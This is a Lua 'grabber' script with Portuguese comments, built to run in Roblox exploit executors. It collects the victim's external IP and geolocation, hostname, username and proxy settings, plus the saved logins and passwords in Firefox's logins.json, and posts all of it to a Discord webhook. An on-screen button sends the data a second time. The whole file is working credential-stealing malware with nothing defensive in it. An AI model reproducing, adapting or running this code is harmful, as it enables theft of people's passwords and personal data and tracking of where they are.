-- bf_grabber.lua – roda em Synapse/Fluxus/etc. (executor compatível com http e io)
local WEBHOOK = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
local PORT    = 50000           -- porta interna para o "pseudo-link", se quiser
--[[ CONFIG ––––––––– ]]--
--[[ 0. obter IP externo ]]--
local external_ip = game:HttpGet("https://checkip.amazonaws.com", true)
external_ip = external_ip:gsub("%s+", "") -- trim newline

--[[ 1. geo IP ]]--
local geo_raw   = game:HttpGet("http://ip-api.com/json/"..external_ip.."?fields=status,country,countryCode,city,lat,lon,timezone,isp,org,query", true)
local geo       = game:GetService("HttpService"):JSONDecode(geo_raw)

--[[ 2. informações do sistema (hostname, user, pasta APPDATA) ]]--
local APPDATA   = os.getenv("APPDATA") or os.getenv("HOME") or ""
local hostname  = os.getenv("COMPUTERNAME") or "Unknown"
local username  = os.getenv("USERNAME")   or os.getenv("USER") or "Unknown"
local platform  = os.date("%OS") == "Windows" and "Windows" or "Unix"

local http_proxy  = os.getenv("http_proxy")
local https_proxy = os.getenv("https_proxy")

--[[ 3. coletar senhas do Firefox (logins.json) ]]--
local firefoxPasswords = {}
local profilePath  = APPDATA:gsub("Roaming", "Roaming/Mozilla/Firefox")
local search       = io.popen('dir "'..profilePath..'" /s /b | findstr "logins.json"'):read("*a")
if search and #search > 0 then
    -- primeiro match
    local file = io.open(search:match("[^\r\n]+"), "r")
    if file then
        local raw = file:read("*a")
        file:close()
        local logins = game:GetService("HttpService"):JSONDecode(raw).logins or {}
        for _,v in ipairs(logins) do
            table.insert(firefoxPasswords, {
                hostname = v.hostname or "",
                username = v.username or "",
                password = v.password or ""
            })
        end
    end
else
    firefoxPasswords = {error = "Profile/Firefox not found"}
end

--[[ 4. monta payload idêntico ao Python ]]--
local payload = {
    ip            = external_ip,
    city          = geo.city     or "",
    country       = geo.country  or "",
    countryCode   = geo.countryCode or "",
    lat           = geo.lat      or 0,
    lon           = geo.lon      or 0,
    timezone      = geo.timezone or "",
    isp           = geo.isp      or "",
    org           = geo.org      or "",
    hostname      = hostname,
    username      = username,
    platform      = platform,
    http_proxy    = http_proxy,
    https_proxy   = https_proxy,
    firefox_passwords = firefoxPasswords
}

--[[ 5. envia webhook ]]--
local body = game:GetService("HttpService"):JSONEncode(payload)
local headers = {["Content-Type"] = "application/json"}
local response = request({
    Url     = WEBHOOK,
    Method  = "POST",
    Headers = headers,
    Body    = body
})
--[[ opcional: print(result) ]]--
print("Dados enviados para Discord – "..(response and response.StatusCode or "erro"))

--[[ 6. (extra) cria um “link interno” no roblox – abre janela com botão ]]--
local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
local TextBtn   = Instance.new("TextButton", ScreenGui)
TextBtn.Size     = UDim2.new(0, 200, 0, 50)
TextBtn.Position = UDim2.new(0.5, -100, 0.5, -25)
TextBtn.Text     = "Clique aqui"
TextBtn.MouseButton1Click:Connect(function()
    -- dispara tudo novamente (se quiser reutilizar)
    request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
    TextBtn.Text = "OK enviado"
    wait(2)
    ScreenGui:Destroy()
end)
